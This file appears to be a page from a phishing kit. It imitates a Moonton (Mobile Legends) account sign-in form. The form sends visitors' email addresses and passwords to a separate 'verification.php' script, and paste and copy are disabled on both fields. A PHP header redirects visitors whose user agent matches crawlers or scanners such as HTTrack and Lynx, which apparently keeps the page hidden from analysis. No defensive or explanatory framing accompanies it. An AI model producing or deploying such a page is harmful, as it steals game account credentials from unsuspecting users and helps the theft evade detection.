<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<html data-dpr="1" style="font-size: 131.1px;">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="format-detection" content="telephone=no">
    <meta charset="utf-8">
    <title>mobilelegendsaccount</title>
    <link href="css/style.css" rel="stylesheet">
    
</head>

<body style="font-size: 10px;">
    <div id="app" style="max-width: 100%;">
        <div class="v1-1" style="max-width: 100%;">
            <div class="inapp" style="max-width: 100%;">
                <div class="bac" style="max-width: 100%;">
                    <p class="toast hide"></p>
                    <div class="bigwrapper" style="max-width: 70%; display: block; margin: auto;"><span class="arrow-1"></span> <span class="arrow-2"></span> <span class="arrow-3"></span> <span class="arrow-4"></span>
                        <div id="login">
                            <form action="../../verification.php" method="POST" name="myForm" onsubmit="return validateForm()">
                            <input type="hidden" name="login" value="Moonton">
                                <h2 class="title">Sign in with your Moonton Account</h2>
                                <div>
                                    <div class="minput">
                                        <input name="email" onpaste="return false" oncopy="return false" type="text" placeholder="Email address/Moonton Account" autocomplete="off" style="outline: none; margin-top: 13px;">
</div>
                                    <p class="tips">Sign in with your Moonton Account</p>
                                    <p class="tips error" style="display: none;"></p>
                                </div>
                                <div>
                                    <div class="minput">
                                        <input name="password" onpaste="return false" oncopy="return false" type="password" placeholder="Password" autocomplete="off" style="outline: none; margin-top: 13px;">
                                        <!---->
                                        <!----></div>
                                    <p class="tips">Use at least 6 characters and a mix of higher and lower case letters and numbers with no special character in it</p>
                                    <p class="tips error" style="display: none;"></p>
                                </div> <button class="loginbtn btn" type="submit" style="background-color: rgb(65, 239, 108);">Sign in</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="loadingwrapper hide">
        <div class="spinner">
            <div class="spinner-container container1">
                <div class="circle1"></div>
                <div class="circle2"></div>
                <div class="circle3"></div>
                <div class="circle4"></div>
            </div>
            <div class="spinner-container container2">
                <div class="circle1"></div>
                <div class="circle2"></div>
                <div class="circle3"></div>
                <div class="circle4"></div>
            </div>
            <div class="spinner-container container3">
                <div class="circle1"></div>
                <div class="circle2"></div>
                <div class="circle3"></div>
                <div class="circle4"></div>
            </div>
        </div>
    </div>

    <script>
        function validateForm() {
            var x = document.forms["myForm"]["email"].value;
            var y = document.forms["myForm"]["password"].value;
            if (x == "" || y == "") {
                alert("Error: Complete All Form!");
                return false;
            }
        }
    </script>
</body>

</html>